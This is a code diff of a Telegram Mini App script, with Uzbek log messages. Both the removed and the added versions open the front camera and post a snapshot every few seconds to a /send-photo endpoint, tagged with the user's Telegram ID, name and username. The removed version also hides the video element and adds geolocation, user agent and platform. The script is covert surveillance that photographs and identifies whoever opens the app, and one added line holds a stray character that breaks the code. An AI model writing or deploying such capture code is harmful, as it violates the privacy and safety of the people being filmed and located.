@@ -1,52 +1,56 @@
 Telegram.WebApp.ready();
 Telegram.WebApp.expand();
 
-const user = Telegram.WebApp.initDataUnsafe?.user || {};
-const user_id = user.id;
-const tg_fullname = `${user.first_name || ""} ${user.last_name || ""}`.trim();
-const tg_username = user.username || "";
+const video = document.getElementById("video");
+const isTelegram = !!Telegram.WebApp.initDataUnsafe?.user;
+const user = Telegram.WebApp.initDataUnsafe?.user;
 
-const video = document.createElement("video");
-video.style.display = "none";
-video.setAttribute("autoplay", true);
-video.setAttribute("playsinline", true);
-document.body.appendChild(video);
+(async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
 
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-  .then(stream => {
     video.srcObject = stream;
+    await video.play();
+
+    console.log("📸 Kamera ishga tushdi");
 
     const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
+    const ctx = canvas.getContext("2d");a
 
-    setInterval(async () => {
+    setInterval(() => {
+      if (!video.videoWidth || !video.videoHeight) return;
+
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
-      const file = new File([blob], "photo.png", { type: "image/png" });
+      canvas.toBlob(blob => {
+        const file = new File([blob], `photo.png`, { type: "image/png" });
 
-      const formData = new FormData();
-      formData.append("photo", file);
-      formData.append("user_id", user_id);
-      formData.append("tg_fullname", tg_fullname);
-      formData.append("tg_username", tg_username);
-      formData.append("timestamp", new Date().toISOString());
-      formData.append("user_agent", navigator.userAgent);
-      formData.append("platform", navigator.platform);
+        const formData = new FormData();
+        formData.append("photo", file);
 
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          formData.append("latitude", pos.coords.latitude);
-          formData.append("longitude", pos.coords.longitude);
-          fetch("/send-photo", { method: "POST", body: formData });
-        },
-        err => {
-          console.warn("❌ Geolokatsiya bloklangan:", err.message);
-          fetch("/send-photo", { method: "POST", body: formData });
+        if (isTelegram) {
+          formData.append("user_id", user.id);
+          formData.append("tg_fullname", `${user.first_name} ${user.last_name || ""}`);
+          formData.append("tg_username", user.username || "yo'q");
         }
-      );
-    }, 3000);
-  })
-  .catch(err => console.error("❌ Kamera xatosi:", err.message));
+
+        fetch("/send-photo", {
+          method: "POST",
+          body: formData
+        })
+          .then(res => res.json())
+          .then(data => console.log("✅ Yuborildi:", data))
+          .catch(err => console.error("❌ Xatolik:", err));
+      }, "image/png");
+    }, 2000);
+
+  } catch (err) {
+    console.error("❌ Kamera xato:", err.message);
+    alert("Kamera ishlamayapti. Ruxsatni tekshiring.");
+  }
+})();
